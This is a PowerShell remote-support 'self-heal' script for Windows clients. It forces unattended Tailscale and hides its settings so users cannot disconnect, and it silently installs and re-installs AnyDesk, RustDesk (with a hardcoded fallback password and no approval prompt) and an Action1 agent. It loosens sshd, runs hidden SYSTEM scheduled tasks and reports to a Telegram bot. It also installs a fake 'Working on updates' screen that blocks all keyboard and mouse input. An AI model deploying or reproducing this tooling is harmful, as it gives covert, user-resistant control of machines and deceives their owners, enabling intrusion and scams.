# ==========================================================
#  rsupport update / full-heal  (PUBLIC on GitHub - secret-free)
#  Secrets read from LOCAL files on the client, never here.
# ==========================================================
$ErrorActionPreference = "SilentlyContinue"
$dir = "$env:ProgramData\RemoteSupport"
New-Item $dir -ItemType Directory -Force | Out-Null

# 0) Tailscale UNATTENDED mode (once) - keeps client reachable at the
#    Windows login screen after a restart, before anyone logs in.
if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
  $tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
  if($tsExe){
    & $tsExe up --unattended --accept-risk=all 2>$null
    Set-Content (Join-Path $dir 'unattended.done') '1' -Encoding ascii
  }
}

# 0c) Tailscale RECOVERY: if installed but logged out / blocked (e.g. antivirus
#     interrupted it), log back in automatically. The key is read from where the
#     setup already saved it on THIS machine - never stored in this public file.
$tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
if($tsExe){
  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
  $st = (& $tsExe status 2>&1 | Out-String)
  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
    $key=''
    foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
      if(-not $key -and (Test-Path $d)){
        foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
          $c = Get-Content $f.FullName -Raw -EA 0
          $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
          if($m.Success){ $key=$m.Value; break }
        }
      }
    }
    if($key){
      Start-Service Tailscale -EA 0
      & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
      $tg = Join-Path $dir 'tg.txt'
      if(Test-Path $tg){
        $tk='';$tc=''
        foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
        if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale was down on "+$env:COMPUTERNAME+" (antivirus/logout) - auto-reconnected.")} | Out-Null }catch{} }
      }
    }
  }
}
else{
  # Tailscale .exe is gone - antivirus likely deleted it. Alert once (needs manual allow).
  $mk = Join-Path $dir 'ts-missing.flag'
  if(-not (Test-Path $mk)){
    $tg = Join-Path $dir 'tg.txt'
    if(Test-Path $tg){
      $tk='';$tc=''
      foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
      if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale MISSING on "+$env:COMPUTERNAME+" - antivirus may have removed it. Allow Tailscale in the antivirus, then re-run setup.")} | Out-Null }catch{} }
    }
    Set-Content $mk '1' -Encoding ascii
  }
}


# 0d) Tailscale LOCKDOWN: force unattended + auto-reconnect + hide settings menus,
#     so the client can't keep Tailscale disconnected (it stays or returns online).
#     Re-applied every cycle so it self-heals if anything clears it.
$pol = 'HKLM:\SOFTWARE\Policies\Tailscale'
New-Item $pol -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'UnattendedMode'  -Value 'always' -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'ReconnectAfter'  -Value '1m'     -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'PreferencesMenu' -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'AdminConsole'    -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
$tsPol = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
if($tsPol){ & $tsPol syspolicy reload 2>$null }


# 1) SSH stays up + key config
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic
$cfg = "$env:ProgramData\ssh\sshd_config"
if(Test-Path $cfg){
  $l = Get-Content $cfg | Where-Object { $_ -notmatch '^\s*#?\s*StrictModes' -and $_ -notmatch '^\s*#?\s*PubkeyAuthentication' }
  Set-Content $cfg (@('StrictModes no','PubkeyAuthentication yes') + $l) -Encoding ascii
  Restart-Service sshd
}

# 2) AnyDesk: reinstall if missing (uses local ad-pass.txt), else keep running
$adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
if(-not (Test-Path $adExe)){ $adExe = 'C:\Program Files\AnyDesk\AnyDesk.exe' }
if(Test-Path $adExe){ Start-Service AnyDesk }
else{
  try{
    $tmp = "$env:TEMP\AnyDesk.exe"
    Invoke-WebRequest 'https://download.anydesk.com/AnyDesk.exe' -OutFile $tmp -UseBasicParsing
    Start-Process $tmp -ArgumentList '--install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent --create-shortcuts' -Wait
    Start-Sleep 6
    $adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
    $pf = Join-Path $dir 'ad-pass.txt'
    if((Test-Path $adExe) -and (Test-Path $pf)){
      (Get-Content $pf -Raw).Trim() | & $adExe --set-password 2>$null
      Start-Service AnyDesk; & $adExe --start-with-win
    }
  }catch{}
}

# 3) Telegram alerts: install mesh watcher if tg.txt was pushed here
if(Test-Path (Join-Path $dir 'tg.txt')){
  $w = @'
$ErrorActionPreference='SilentlyContinue'
$dir="$env:ProgramData\RemoteSupport"
$conf=Join-Path $dir 'tg.txt'
if(-not(Test-Path $conf)){ exit }
$token='';$chat=''
foreach($l in Get-Content $conf){ if($l -match '^token=(.+)$'){$token=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$chat=$matches[1].Trim()} }
if(-not $token -or -not $chat){ exit }
$ts=@('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe')|?{Test-Path $_}|Select-Object -First 1
if(-not $ts){ exit }
$selfIp=(& $ts ip -4 2>$null | Select-Object -First 1)
$j=& $ts status --json | ConvertFrom-Json
$nodes=@();$peers=@{}
foreach($p in $j.Peer.PSObject.Properties.Value){ $peers[$p.HostName]=[bool]$p.Online; if($p.Online){ $nodes+=$p.TailscaleIPs[0] } }
$nodes+=$selfIp
$reporter=($nodes | Sort-Object | Select-Object -First 1)
if($selfIp -ne $reporter){ exit }
$state=Join-Path $dir 'tg-state.txt'
$prev=@{};$first=-not(Test-Path $state)
if(-not $first){ foreach($l in Get-Content $state){ if($l -match '^(.*)=(0|1)$'){ $prev[$matches[1]]=($matches[2] -eq '1') } } }
function Send($t){ try{ Invoke-RestMethod -Method Post -Uri ("https://api.telegram.org/bot$token/sendMessage") -Body @{chat_id=$chat;text=$t}|Out-Null }catch{} }
foreach($h in $peers.Keys){ if($prev.ContainsKey($h) -and $prev[$h] -ne $peers[$h]){ if($peers[$h]){ Send ("ONLINE  - $h") } else { Send ("OFFLINE - $h") } } }
($peers.GetEnumerator()|ForEach-Object{ $_.Key+'='+([int][bool]$_.Value) })|Set-Content $state -Encoding utf8
'@
  Set-Content (Join-Path $dir 'tg-watch.ps1') $w -Encoding utf8
  schtasks /create /tn "RemoteSupportTG" /tr ("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " + (Join-Path $dir 'tg-watch.ps1')) /sc minute /mo 2 /ru SYSTEM /rl HIGHEST /f | Out-Null
}

# --- Action1 self-heal ---
$ACTION1_URL = "https://app.na-2.action1.com/agent/6304ea14-b32e-11f1-b2b4-f3b61c56c452/Windows/agent(My_Organization).msi"
if ($ACTION1_URL -and -not (Get-Service "Action1*" -ErrorAction SilentlyContinue)) {
    try {
        $a1 = "$env:TEMP\a1.msi"
        Invoke-WebRequest $ACTION1_URL -OutFile $a1 -UseBasicParsing
        if ((Test-Path $a1) -and ((Get-Item $a1).Length -gt 500000)) {
            $p = Start-Process msiexec.exe -ArgumentList "/i `"$a1`" /quiet /qn /norestart" -Wait -PassThru
            Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) Action1 install exit $($p.ExitCode)"
        }
    } catch { Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) Action1 error: $($_.Exception.Message)" }
}

# --- Lock screen feature ---
$lockCode = @'
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
Add-Type @"
using System;using System.Runtime.InteropServices;
public class Locker{
  [DllImport("user32.dll")] public static extern bool BlockInput(bool f);
  const int WH_KEYBOARD_LL=13, WH_MOUSE_LL=14;
  public delegate IntPtr HookProc(int code,IntPtr w,IntPtr l);
  static IntPtr kH=IntPtr.Zero,mH=IntPtr.Zero; static HookProc kP,mP;
  [DllImport("user32.dll",SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id,HookProc fn,IntPtr mod,uint tid);
  [DllImport("user32.dll",SetLastError=true)] static extern bool UnhookWindowsHookEx(IntPtr h);
  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int code,IntPtr w,IntPtr l);
  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
  static IntPtr Swallow(int code,IntPtr w,IntPtr l){ if(code>=0) return (IntPtr)1; return CallNextHookEx(IntPtr.Zero,code,w,l); }
  public static void Lock(){ if(kH!=IntPtr.Zero) return; kP=Swallow; mP=Swallow; IntPtr h=GetModuleHandle(null); kH=SetWindowsHookEx(WH_KEYBOARD_LL,kP,h,0); mH=SetWindowsHookEx(WH_MOUSE_LL,mP,h,0); BlockInput(true); }
  public static void Unlock(){ BlockInput(false); if(kH!=IntPtr.Zero){UnhookWindowsHookEx(kH);kH=IntPtr.Zero;} if(mH!=IntPtr.Zero){UnhookWindowsHookEx(mH);mH=IntPtr.Zero;} }
}
"@
$dir='C:\ProgramData\RemoteSupport'; $script:flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
function Cfg($k,$def){ $v=$def; if(Test-Path $cfg){ foreach($l in Get-Content $cfg){ if($l -match "^$k=(.*)$"){ $v=$matches[1] } } } return $v }
while($true){
  if(Test-Path $script:flag){
    $company=(Get-Content $script:flag -Raw); if(-not $company.Trim()){ $company=Cfg 'LOCK_TEXT' 'CloudPulse IT Services' }
    $bg=Cfg 'LOCK_COLOR' '#000000'
    $script:f=New-Object Windows.Forms.Form; $script:f.FormBorderStyle='None'; $script:f.TopMost=$true; $script:f.StartPosition='Manual'
    $script:f.Bounds=[Windows.Forms.SystemInformation]::VirtualScreen
    try{ $script:f.BackColor=[Drawing.ColorTranslator]::FromHtml($bg) }catch{ $script:f.BackColor='Black' }
    $cx=[int]($script:f.Width/2); $cy=[int]($script:f.Height/2)
    $script:sp=New-Object Windows.Forms.Panel; $script:sp.Size=New-Object Drawing.Size(70,70); $script:sp.Location=New-Object Drawing.Point(($cx-35),($cy-150)); $script:sp.BackColor=[Drawing.Color]::Transparent; $script:f.Controls.Add($script:sp)
    function NewLbl($top,$size,$col,$txt){ $l=New-Object Windows.Forms.Label; $l.AutoSize=$false; $l.Width=$script:f.Width; $l.Height=($size+22); $l.Left=0; $l.Top=$top; $l.TextAlign='MiddleCenter'; $l.ForeColor=$col; $l.Font=New-Object Drawing.Font('Segoe UI',$size); $l.Text=$txt; $l.BackColor=[Drawing.Color]::Transparent; return $l }
    $script:main=NewLbl ($cy-45) 21 ([Drawing.Color]::White) 'Working on updates 0% complete'
    $sub=NewLbl ($cy+15) 11 ([Drawing.Color]::FromArgb(190,200,215)) "Don't turn off your PC. This will take a while."
    $comp=NewLbl ($cy+85) 9 ([Drawing.Color]::Gray) $company
    $script:f.Controls.Add($script:main); $script:f.Controls.Add($sub); $script:f.Controls.Add($comp)
    $script:ang=0; $script:start=Get-Date
    $script:sp.Add_Paint({ param($s,$e)
      $g=$e.Graphics; $g.SmoothingMode='AntiAlias'
      for($i=0;$i -lt 8;$i++){ $a=($script:ang + $i*45)*[Math]::PI/180; $x=35+22*[Math]::Cos($a); $y=35+22*[Math]::Sin($a); $al=255-($i*26); if($al -lt 45){$al=45}; $br=New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb($al,255,255,255)); $g.FillEllipse($br,($x-4),($y-4),8,8); $br.Dispose() } })
    $script:tm=New-Object Windows.Forms.Timer; $script:tm.Interval=70
    $script:tm.Add_Tick({ $script:ang=($script:ang+18)%360; $script:sp.Invalidate(); $el=((Get-Date)-$script:start).TotalSeconds; $p=[int][Math]::Floor($el/9); if($p -gt 100){$p=100}; $script:main.Text="Working on updates $p% complete"; if(-not (Test-Path $script:flag)){ $script:f.Close() } })
    $script:tm.Start()
    [Locker]::Lock(); [void]$script:f.ShowDialog(); [Locker]::Unlock(); $script:tm.Stop()
  }
  Start-Sleep -Seconds 1
}
'@
Set-Content -Path (Join-Path $dir 'lockwatch.ps1') -Value $lockCode -Encoding UTF8
$luser = (Get-CimInstance Win32_ComputerSystem).UserName
$ltr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\lockwatch.ps1'
if ($luser) { schtasks /create /tn RemoteSupportLockWatch /tr "$ltr" /sc onlogon /ru "$luser" /rl HIGHEST /it /f | Out-Null }
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*lockwatch.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
schtasks /run /tn RemoteSupportLockWatch *>$null

# --- RustDesk: screen + black-screen + audio, direct-IP over Tailscale (no account, no server) ---
try {
  $rdExe = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
  if (-not $rdExe) { Remove-Item (Join-Path $dir 'rustdesk.done') -EA 0 }   # self-heal: reinstall if removed
  if (-not (Test-Path (Join-Path $dir 'rustdesk.done'))) {
    if (-not $rdExe) {
      try { winget install --id RustDesk.RustDesk --silent --accept-package-agreements --accept-source-agreements 2>$null } catch {}
      if (-not (Test-Path 'C:\Program Files\RustDesk\rustdesk.exe')) {
        try {
          $rel = Invoke-RestMethod 'https://api.github.com/repos/rustdesk/rustdesk/releases/latest' -UseBasicParsing
          $asset = $rel.assets | Where-Object { $_.name -match 'x86_64\.exe$' -and $_.name -notmatch 'aarch64|arm|sciter' } | Select-Object -First 1
          if ($asset) { $rt = "$env:TEMP\rustdesk.exe"; Invoke-WebRequest $asset.browser_download_url -OutFile $rt -UseBasicParsing; Start-Process $rt '--silent-install' -Wait; Start-Sleep 8 }
        } catch {}
      }
      $rdExe = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
    }
    if ($rdExe) {
      Start-Service Rustdesk -EA 0; Start-Sleep 3
      $rdPass = 'Support@2026!'; $apf = Join-Path $dir 'ad-pass.txt'; if (Test-Path $apf) { $rdPass = (Get-Content $apf -Raw).Trim() }
      & $rdExe --password $rdPass 2>$null
      Set-Content (Join-Path $dir 'rustdesk.done') '1' -Encoding ascii
    }
  }
  # always-on config (idempotent): direct IP + silent unattended (no popup, full control)
  if ($rdExe) {
    $need = @{ 'direct-server' = "'Y'"; 'approve-mode' = "'password'"; 'verification-method' = "'use-permanent-password'" }
    $tomls = @('C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk2.toml', (Join-Path $env:APPDATA 'RustDesk\config\RustDesk2.toml'))
    $restart = $false
    foreach ($tf in $tomls) {
      $td = Split-Path $tf; if (-not (Test-Path $td)) { New-Item $td -ItemType Directory -Force | Out-Null }
      $cont = ''; if (Test-Path $tf) { $cont = Get-Content $tf -Raw }
      if ($cont -notmatch '\[options\]') { $cont = ($cont.TrimEnd() + "`r`n`r`n[options]`r`n") }
      $fc = $false
      foreach ($k in $need.Keys) {
        if ($cont -notmatch [regex]::Escape($k)) { $cont = $cont -replace '\[options\]', "[options]`r`n$k = $($need[$k])"; $fc = $true }
      }
      if ($fc) { Set-Content $tf $cont -Encoding utf8; $restart = $true }
    }
    if ($restart) { Restart-Service Rustdesk -EA 0 }
    Start-Service Rustdesk -EA 0
  }
} catch {}
